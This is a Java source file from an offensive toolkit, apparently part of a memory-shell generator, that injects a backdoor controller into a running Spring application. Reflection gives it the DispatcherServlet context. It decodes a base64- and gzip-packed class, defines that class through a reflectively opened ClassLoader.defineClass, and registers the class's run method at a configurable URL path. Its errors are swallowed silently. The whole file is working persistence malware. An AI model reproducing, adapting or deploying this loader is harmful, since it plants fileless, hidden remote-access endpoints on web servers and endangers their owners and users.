package com.ppp.middleware.loader;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.JavaClassType;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 */
@Middleware(Middleware.Spring)
@MemShell(MemShell.Controller)
@JavaClassType(JavaClassType.Default)
@JavaClassModifiable({JavaClassModifiable.PATH, JavaClassModifiable.NAME, JavaClassModifiable.CLASSNAME})
public class SpringControllerContextLoader {
    private static String gzipObject;
    private static String PATH;
    private static String NAME;
    private static String CLASSNAME;

    public SpringControllerContextLoader() {
        try {
            inject();
        } catch (Exception e) {

        }
    }

    public static void inject() throws Exception {
        Object requestAttributes = Class.forName("org.springframework.web.context.request.RequestContextHolder").getMethod("currentRequestAttributes").invoke(null);
        Object context = invokeMethod(requestAttributes.getClass(), requestAttributes, "getAttribute", new Class[]{String.class, Integer.TYPE}, new Object[]{"org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0});
//         是否存在路由
        Object mapping = invokeMethod(Class.forName("org.springframework.context.support.AbstractApplicationContext"), context, "getBean", new Class[]{Class.class}, new Object[]{Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping")});

        Object mappingRegistry = invokeMethod(Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping"), mapping, "getMappingRegistry", new Class[]{}, new Object[]{});

        Map urlLookup = (Map) getFieldValue(mappingRegistry, "nameLookup");
        for (Object urlPath : urlLookup.keySet()) {
            if (NAME.equals(urlPath)) {
                return;
            }
        }

        byte[] bytes = decompress(gzipObject);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz = null;
        try {
            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        } catch (Exception e) {
            clazz = classLoader.loadClass(CLASSNAME);
        }
        Constructor constructor = clazz.getDeclaredConstructor();
        constructor.setAccessible(true);
        Object javaObject = constructor.newInstance();

        Method run = clazz.getDeclaredMethod("run");
        Object config = getFieldValue(mapping, "config");

        Object paths = invokeMethod(Class.forName("org.springframework.web.servlet.mvc.method.RequestMappingInfo"), null, "paths", new Class[]{String[].class}, new Object[]{new String[]{PATH}});
        Object options = invokeMethod(paths.getClass(), paths, "options", new Class[]{Class.forName("org.springframework.web.servlet.mvc.method.RequestMappingInfo$BuilderConfiguration")}, new Object[]{config});
        Object requestMappingInfo = invokeMethod(paths.getClass(), options, "build", new Class[]{}, new Object[]{});
        setFieldValue(requestMappingInfo, "name", NAME);

        invokeMethod(Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping"), mapping, "registerMapping", new Class[]{Class.forName("org.springframework.web.servlet.mvc.method.RequestMappingInfo"), Object.class, Method.class}, new Object[]{requestMappingInfo, javaObject, run});
    }

    public static byte[] decompress(String gzipObject) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(base64(gzipObject));
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static byte[] base64(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) invokeMethod(clazz.getSuperclass(), clazz.newInstance(), "decodeBuffer", new Class[]{String.class}, new Object[]{str});
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = invokeMethod(clazz, null, "getDecoder", new Class[]{}, new Object[]{});
            return (byte[]) invokeMethod(decoder.getClass(), decoder, "decode", new Class[]{String.class}, new Object[]{str});
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
}
